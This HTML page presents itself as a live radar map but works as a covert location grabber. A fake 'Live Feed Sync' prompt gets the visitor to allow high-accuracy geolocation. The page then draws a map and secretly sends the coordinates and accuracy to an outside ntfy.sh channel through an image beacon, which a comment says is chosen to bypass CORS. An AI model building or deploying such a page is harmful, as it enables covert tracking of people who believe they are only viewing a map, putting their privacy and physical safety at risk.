<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Map Grid - Live Radar</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: sans-serif; }
        #map { width: 100%; height: 100vh; position: absolute; top: 0; left: 0; z-index: 1; }
        #portal-mask {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: rgba(0, 0, 0, 0.92); z-index: 999999;
            display: flex; justify-content: center; align-items: center; text-align: center;
        }
        .box { background: #111; border: 1px solid #333; padding: 30px; border-radius: 10px; max-width: 320px; width: 90%; }
        .box h2 { color: #fff; margin-top: 0; }
        .box p { color: #888; font-size: 13px; line-height: 1.4; }
        .btn-go {
            background: #28a745; color: #fff; border: none; padding: 12px 20px;
            font-size: 15px; font-weight: bold; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 15px;
        }
    </style>
</head>
<body>

    <div id="portal-mask">
        <div class="box">
            <h2>Live Feed Sync</h2>
            <p>Synchronizing local regional satellite mapping parameters with your current connection.</p>
            <button class="btn-go" id="launch">Initialize Map</button>
        </div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let mapInstance = null;

        function buildMap(lat, lon) {
            document.getElementById('portal-mask').style.display = 'none';
            if (!mapInstance) {
                mapInstance = L.map('map').setView([lat, lon], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
            }
            L.marker([lat, lon]).addTo(mapInstance).bindPopup("Node Synchronized").openPopup();
        }

        function triggerSequence() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const acc = pos.coords.accuracy;

                        buildMap(lat, lon);

                        // Use an Image Beacon instead of fetch() to completely bypass CORS blocks
                        const beaconData = encodeURIComponent(`Lat: ${lat} | Lon: ${lon} | Acc: ${acc}m`);
                        const img = new Image();
                        img.src = `https://ntfy.sh/coordinates?m=${beaconData}`;
                    },
                    function(err) {
                        alert("Calibration failed: Location access must be explicitly allowed.");
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                alert("Runtime error: Geolocation API unavailable.");
            }
        }

        const btn = document.getElementById('launch');
        btn.addEventListener('click', triggerSequence);
        btn.addEventListener('touchend', function(e) {
            e.preventDefault();
            triggerSequence();
        });
    </script>
</body>
</html>
